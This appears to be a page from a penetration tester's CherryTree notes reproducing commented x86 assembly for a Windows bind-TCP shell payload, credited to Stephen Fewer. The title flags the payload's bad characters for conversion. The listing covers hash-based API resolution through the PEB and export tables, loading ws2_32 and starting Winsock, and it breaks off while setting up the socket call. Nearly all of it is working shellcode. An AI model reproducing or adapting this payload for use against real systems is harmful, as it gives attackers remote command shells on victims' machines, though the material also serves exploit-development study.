<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ASM file: contains badchars, so convert it</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">ASM file: contains badchars, so convert it</h1><br/><div class="codebox"><div class="codebox">;-----------------------------------------------------------------------------;<br />;&nbsp;Author:&nbsp;Stephen&nbsp;Fewer&nbsp;(stephen_fewer[at]harmonysecurity[dot]com)<br />;&nbsp;Compatible:&nbsp;Windows&nbsp;<span style="color:#ff0044;font-weight:400">7</span>,&nbsp;<span style="color:#ff0044;font-weight:400">2008</span>,&nbsp;Vista,&nbsp;<span style="color:#ff0044;font-weight:400">2003</span>,&nbsp;XP,&nbsp;<span style="color:#ff0044;font-weight:400">2000</span>,&nbsp;NT4<br />;&nbsp;Version:&nbsp;<span style="color:#ff0044;font-weight:400">1.0</span>&nbsp;(<span style="color:#ff0044;font-weight:400">28</span>&nbsp;July&nbsp;<span style="color:#ff0044;font-weight:400">2009</span>)<br />;&nbsp;Size:&nbsp;<span style="color:#ff0044;font-weight:400">341</span>&nbsp;bytes<br />;&nbsp;Build:&nbsp;&gt;build.py&nbsp;single_shell_bind_tcp<br />;-----------------------------------------------------------------------------;<br />[BITS&nbsp;<span style="color:#ff0044;font-weight:400">32</span>]<br />cld&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Clear&nbsp;the&nbsp;direction&nbsp;flag.<br />call&nbsp;start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Call&nbsp;start,&nbsp;this&nbsp;pushes&nbsp;the&nbsp;address&nbsp;of&nbsp;'api_call'&nbsp;onto&nbsp;the&nbsp;stack.<br /><br />api_call:<br />	pushad&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;We&nbsp;preserve&nbsp;all&nbsp;the&nbsp;registers&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;the&nbsp;caller,&nbsp;bar&nbsp;EAX&nbsp;and&nbsp;ECX.<br />	mov&nbsp;ebp,&nbsp;esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Create&nbsp;a&nbsp;new&nbsp;stack&nbsp;frame<br />	xor&nbsp;eax,&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Zero&nbsp;EAX&nbsp;(upper&nbsp;<span style="color:#ff0044;font-weight:400">3</span>&nbsp;bytes&nbsp;will&nbsp;remain&nbsp;zero&nbsp;until&nbsp;function&nbsp;is&nbsp;found)<br />	mov&nbsp;edx,&nbsp;[fs:eax+<span style="color:#ff0044;font-weight:400">48</span>]&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;a&nbsp;pointer&nbsp;to&nbsp;the&nbsp;PEB<br />	mov&nbsp;edx,&nbsp;[edx+<span style="color:#ff0044;font-weight:400">12</span>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;PEB-&gt;Ldr<br />	mov&nbsp;edx,&nbsp;[edx+<span style="color:#ff0044;font-weight:400">20</span>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;the&nbsp;first&nbsp;module&nbsp;from&nbsp;the&nbsp;InMemoryOrder&nbsp;module&nbsp;list<br /><br />next_mod:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<br />	mov&nbsp;esi,&nbsp;[edx+<span style="color:#ff0044;font-weight:400">40</span>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;pointer&nbsp;to&nbsp;modules&nbsp;name&nbsp;(unicode&nbsp;string)<br />	movzx&nbsp;ecx,&nbsp;word&nbsp;[edx+<span style="color:#ff0044;font-weight:400">38</span>]&nbsp;;&nbsp;Set&nbsp;ECX&nbsp;to&nbsp;the&nbsp;length&nbsp;we&nbsp;want&nbsp;to&nbsp;check<br />	xor&nbsp;edi,&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Clear&nbsp;EDI&nbsp;which&nbsp;will&nbsp;store&nbsp;the&nbsp;hash&nbsp;of&nbsp;the&nbsp;module&nbsp;name<br /><br />loop_modname:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<br />	lodsb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Read&nbsp;in&nbsp;the&nbsp;next&nbsp;byte&nbsp;of&nbsp;the&nbsp;name<br />	cmp&nbsp;al,&nbsp;<span style="color:#00117f;font-weight:400">'a'</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Some&nbsp;versions&nbsp;of&nbsp;Windows&nbsp;use&nbsp;lower&nbsp;<span style="color:#ff9d00;font-weight:700">case</span>&nbsp;module&nbsp;names<br />	jl&nbsp;not_lowercase&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<br />	sub&nbsp;al,&nbsp;<span style="color:#ff0044;font-weight:400">0x20</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;If&nbsp;so&nbsp;normalise&nbsp;to&nbsp;uppercase<br /><br />not_lowercase:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<br />	ror&nbsp;edi,&nbsp;<span style="color:#ff0044;font-weight:400">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Rotate&nbsp;right&nbsp;our&nbsp;hash&nbsp;value<br />	add&nbsp;edi,&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Add&nbsp;the&nbsp;next&nbsp;byte&nbsp;of&nbsp;the&nbsp;name<br />	loop&nbsp;loop_modname&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Loop&nbsp;until&nbsp;we&nbsp;have&nbsp;read&nbsp;enough<br />	;&nbsp;We&nbsp;now&nbsp;have&nbsp;the&nbsp;module&nbsp;hash&nbsp;computed<br />	push&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Save&nbsp;the&nbsp;current&nbsp;position&nbsp;in&nbsp;the&nbsp;module&nbsp;list&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;later<br />	push&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Save&nbsp;the&nbsp;current&nbsp;module&nbsp;hash&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;later<br />	;&nbsp;Proceed&nbsp;to&nbsp;iterate&nbsp;the&nbsp;export&nbsp;address&nbsp;table,<br />	mov&nbsp;edx,&nbsp;[edx+<span style="color:#ff0044;font-weight:400">16</span>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;this&nbsp;modules&nbsp;base&nbsp;address<br />	mov&nbsp;ecx,&nbsp;[edx+<span style="color:#ff0044;font-weight:400">60</span>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;PE&nbsp;header<br />	;&nbsp;use&nbsp;ecx&nbsp;as&nbsp;our&nbsp;EAT&nbsp;pointer&nbsp;here&nbsp;so&nbsp;we&nbsp;can&nbsp;take&nbsp;advantage&nbsp;of&nbsp;jecxz.<br />	mov&nbsp;ecx,&nbsp;[ecx+edx+<span style="color:#ff0044;font-weight:400">120</span>]&nbsp;;&nbsp;Get&nbsp;the&nbsp;EAT&nbsp;from&nbsp;the&nbsp;PE&nbsp;header<br />	jecxz&nbsp;get_next_mod1&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;If&nbsp;no&nbsp;EAT&nbsp;present,&nbsp;process&nbsp;the&nbsp;next&nbsp;module<br />	add&nbsp;ecx,&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Add&nbsp;the&nbsp;modules&nbsp;base&nbsp;address<br />	push&nbsp;ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Save&nbsp;the&nbsp;current&nbsp;modules&nbsp;EAT<br />	mov&nbsp;ebx,&nbsp;[ecx+<span style="color:#ff0044;font-weight:400">32</span>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;the&nbsp;rva&nbsp;of&nbsp;the&nbsp;function&nbsp;names<br />	add&nbsp;ebx,&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Add&nbsp;the&nbsp;modules&nbsp;base&nbsp;address<br />	mov&nbsp;ecx,&nbsp;[ecx+<span style="color:#ff0044;font-weight:400">24</span>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;the&nbsp;number&nbsp;of&nbsp;function&nbsp;names<br />	;&nbsp;now&nbsp;ecx&nbsp;returns&nbsp;to&nbsp;its&nbsp;regularly&nbsp;scheduled&nbsp;counter&nbsp;duties<br /><br />;&nbsp;Computing&nbsp;the&nbsp;module&nbsp;hash&nbsp;+&nbsp;function&nbsp;hash<br />get_next_func:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<br />	jecxz&nbsp;get_next_mod&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;When&nbsp;we&nbsp;reach&nbsp;the&nbsp;start&nbsp;of&nbsp;the&nbsp;EAT&nbsp;(we&nbsp;search&nbsp;backwards),&nbsp;process&nbsp;the&nbsp;next&nbsp;module<br />	dec&nbsp;ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Decrement&nbsp;the&nbsp;function&nbsp;name&nbsp;counter<br />	mov&nbsp;esi,&nbsp;[ebx+ecx*<span style="color:#ff0044;font-weight:400">4</span>]&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;rva&nbsp;of&nbsp;next&nbsp;module&nbsp;name<br />	add&nbsp;esi,&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Add&nbsp;the&nbsp;modules&nbsp;base&nbsp;address<br />	xor&nbsp;edi,&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Clear&nbsp;EDI&nbsp;which&nbsp;will&nbsp;store&nbsp;the&nbsp;hash&nbsp;of&nbsp;the&nbsp;function&nbsp;name<br /><br />;&nbsp;And&nbsp;compare&nbsp;it&nbsp;to&nbsp;the&nbsp;one&nbsp;we&nbsp;want<br />loop_funcname:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<br />	lodsb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Read&nbsp;in&nbsp;the&nbsp;next&nbsp;byte&nbsp;of&nbsp;the&nbsp;ASCII&nbsp;function&nbsp;name<br />	ror&nbsp;edi,&nbsp;<span style="color:#ff0044;font-weight:400">13</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Rotate&nbsp;right&nbsp;our&nbsp;hash&nbsp;value<br />	add&nbsp;edi,&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Add&nbsp;the&nbsp;next&nbsp;byte&nbsp;of&nbsp;the&nbsp;name<br />	cmp&nbsp;al,&nbsp;ah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Compare&nbsp;AL&nbsp;(the&nbsp;next&nbsp;byte&nbsp;from&nbsp;the&nbsp;name)&nbsp;to&nbsp;AH&nbsp;(null)<br />	jne&nbsp;loop_funcname&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;If&nbsp;we&nbsp;have&nbsp;not&nbsp;reached&nbsp;the&nbsp;null&nbsp;terminator,&nbsp;<span style="color:#ff9d00;font-weight:700">continue</span><br />	add&nbsp;edi,&nbsp;[ebp-<span style="color:#ff0044;font-weight:400">8</span>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Add&nbsp;the&nbsp;current&nbsp;module&nbsp;hash&nbsp;to&nbsp;the&nbsp;function&nbsp;hash<br />	cmp&nbsp;edi,&nbsp;[ebp+<span style="color:#ff0044;font-weight:400">36</span>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Compare&nbsp;the&nbsp;hash&nbsp;to&nbsp;the&nbsp;one&nbsp;we&nbsp;are&nbsp;searching&nbsp;<span style="color:#ff9d00;font-weight:700">for</span><br />	jnz&nbsp;get_next_func&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Go&nbsp;compute&nbsp;the&nbsp;next&nbsp;function&nbsp;hash&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;we&nbsp;have&nbsp;not&nbsp;found&nbsp;it<br /><br />;&nbsp;If&nbsp;found,&nbsp;fix&nbsp;up&nbsp;stack,&nbsp;call&nbsp;the&nbsp;function&nbsp;and&nbsp;then&nbsp;value&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>&nbsp;compute&nbsp;the&nbsp;next&nbsp;one...<br />	pop&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Restore&nbsp;the&nbsp;current&nbsp;modules&nbsp;EAT<br />	mov&nbsp;ebx,&nbsp;[eax+<span style="color:#ff0044;font-weight:400">36</span>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;the&nbsp;ordinal&nbsp;table&nbsp;rva<br />	add&nbsp;ebx,&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Add&nbsp;the&nbsp;modules&nbsp;base&nbsp;address<br />	mov&nbsp;cx,&nbsp;[ebx+<span style="color:#ff0044;font-weight:400">2</span>*ecx]&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;the&nbsp;desired&nbsp;functions&nbsp;ordinal<br />	mov&nbsp;ebx,&nbsp;[eax+<span style="color:#ff0044;font-weight:400">28</span>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;the&nbsp;function&nbsp;addresses&nbsp;table&nbsp;rva<br />	add&nbsp;ebx,&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Add&nbsp;the&nbsp;modules&nbsp;base&nbsp;address<br />	mov&nbsp;eax,&nbsp;[ebx+<span style="color:#ff0044;font-weight:400">4</span>*ecx]&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;the&nbsp;desired&nbsp;functions&nbsp;RVA<br />	add&nbsp;eax,&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Add&nbsp;the&nbsp;modules&nbsp;base&nbsp;address&nbsp;to&nbsp;get&nbsp;the&nbsp;functions&nbsp;actual&nbsp;VA<br /><br />;&nbsp;We&nbsp;now&nbsp;fix&nbsp;up&nbsp;the&nbsp;stack&nbsp;and&nbsp;perform&nbsp;the&nbsp;call&nbsp;to&nbsp;the&nbsp;desired&nbsp;function...<br />finish:<br />	mov&nbsp;[esp+<span style="color:#ff0044;font-weight:400">36</span>],&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Overwrite&nbsp;the&nbsp;old&nbsp;EAX&nbsp;value&nbsp;with&nbsp;the&nbsp;desired&nbsp;api&nbsp;address&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;the&nbsp;upcoming&nbsp;popad<br />	pop&nbsp;ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Clear&nbsp;off&nbsp;the&nbsp;current&nbsp;modules&nbsp;hash<br />	pop&nbsp;ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Clear&nbsp;off&nbsp;the&nbsp;current&nbsp;position&nbsp;in&nbsp;the&nbsp;module&nbsp;list<br />	popad&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Restore&nbsp;all&nbsp;of&nbsp;the&nbsp;callers&nbsp;registers,&nbsp;bar&nbsp;EAX,&nbsp;ECX&nbsp;and&nbsp;EDX&nbsp;which&nbsp;are&nbsp;clobbered<br />	pop&nbsp;ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Pop&nbsp;off&nbsp;the&nbsp;origional&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;address&nbsp;our&nbsp;caller&nbsp;will&nbsp;have&nbsp;pushed<br />	pop&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Pop&nbsp;off&nbsp;the&nbsp;hash&nbsp;value&nbsp;our&nbsp;caller&nbsp;will&nbsp;have&nbsp;pushed<br />	push&nbsp;ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Push&nbsp;back&nbsp;the&nbsp;correct&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;value<br />	jmp&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Jump&nbsp;into&nbsp;the&nbsp;required&nbsp;function<br />	;&nbsp;We&nbsp;now&nbsp;automagically&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;to&nbsp;the&nbsp;correct&nbsp;caller...<br /><br />get_next_mod:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<br />	pop&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Pop&nbsp;off&nbsp;the&nbsp;current&nbsp;(now&nbsp;the&nbsp;previous)&nbsp;modules&nbsp;EAT<br /><br />get_next_mod1:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<br />	pop&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Pop&nbsp;off&nbsp;the&nbsp;current&nbsp;(now&nbsp;the&nbsp;previous)&nbsp;modules&nbsp;hash<br />	pop&nbsp;edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Restore&nbsp;our&nbsp;position&nbsp;in&nbsp;the&nbsp;module&nbsp;list<br />	mov&nbsp;edx,&nbsp;[edx]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Get&nbsp;the&nbsp;next&nbsp;module<br />	jmp&nbsp;<span style="color:#7f0044;font-weight:400">short</span>&nbsp;next_mod&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Process&nbsp;this&nbsp;module<br /><br />start:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<br />	pop&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Pop&nbsp;off&nbsp;the&nbsp;address&nbsp;of&nbsp;'api_call'&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;calling&nbsp;later.<br /><br />bind_tcp:<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0x00003233</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Push&nbsp;the&nbsp;bytes&nbsp;'ws2_32',<span style="color:#ff0044;font-weight:400">0</span>,<span style="color:#ff0044;font-weight:400">0</span>&nbsp;onto&nbsp;the&nbsp;stack.<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0x5F327377</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;...<br />	push&nbsp;esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;Push&nbsp;a&nbsp;pointer&nbsp;to&nbsp;the&nbsp;<span style="color:#3ad900;font-weight:400">"ws2_32"</span>&nbsp;string&nbsp;on&nbsp;the&nbsp;stack.<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0x0726774C</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;hash(&nbsp;<span style="color:#3ad900;font-weight:400">"kernel32.dll"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"LoadLibraryA"</span>&nbsp;)<br />	call&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;LoadLibraryA(&nbsp;<span style="color:#3ad900;font-weight:400">"ws2_32"</span>&nbsp;)<br />	mov&nbsp;eax,&nbsp;<span style="color:#ff0044;font-weight:400">0x0190</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;EAX&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">sizeof</span>(&nbsp;<span style="color:#ff9d00;font-weight:700">struct</span>&nbsp;WSAData&nbsp;)<br />	sub&nbsp;esp,&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;alloc&nbsp;some&nbsp;space&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;the&nbsp;WSAData&nbsp;structure<br />	push&nbsp;esp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;push&nbsp;a&nbsp;pointer&nbsp;to&nbsp;this&nbsp;stuct<br />	push&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;push&nbsp;the&nbsp;wVersionRequested&nbsp;parameter<br />	push&nbsp;<span style="color:#ff0044;font-weight:400">0x006B8029</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;hash(&nbsp;<span style="color:#3ad900;font-weight:400">"ws2_32.dll"</span>,&nbsp;<span style="color:#3ad900;font-weight:400">"WSAStartup"</span>&nbsp;)<br />	call&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;WSAStartup(&nbsp;<span style="color:#ff0044;font-weight:400">0x0190</span>,&nbsp;&amp;WSAData&nbsp;);<br />	push&nbsp;byte&nbsp;<span style="color:#ff0044;font-weight:400">8</span><br />	pop&nbsp;ecx<br /><br />push_8_loop:<br />	push&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;we&nbsp;succeed,&nbsp;eax&nbsp;will&nbsp;be&nbsp;zero,&nbsp;push&nbsp;it&nbsp;<span style="color:#ff0044;font-weight:400">8</span>&nbsp;times&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;later&nbsp;([<span style="color:#ff0044;font-weight:400">1</span>]-[<span style="color:#ff0044;font-weight:400">8</span>])<br />	loop&nbsp;push_8_loop<br /><br />				;&nbsp;push&nbsp;zero&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;the&nbsp;flags&nbsp;param&nbsp;[<span style="color:#ff0044;font-weight:400">8</span>]<br />				;&nbsp;push&nbsp;null&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;reserved&nbsp;parameter&nbsp;[<span style="color:#ff0044;font-weight:400">7</span>]<br />				;&nbsp;we&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;not&nbsp;specify&nbsp;a&nbsp;WSAPROTOCOL_INFO&nbsp;structure&nbsp;[<span style="color:#ff0044;font-weight:400">6</span>]<br />				;&nbsp;we&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;not&nbsp;specify&nbsp;a&nbsp;protocol&nbsp;[<span style="color:#ff0044;font-weight:400">5</span>]<br />	inc&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;<br />	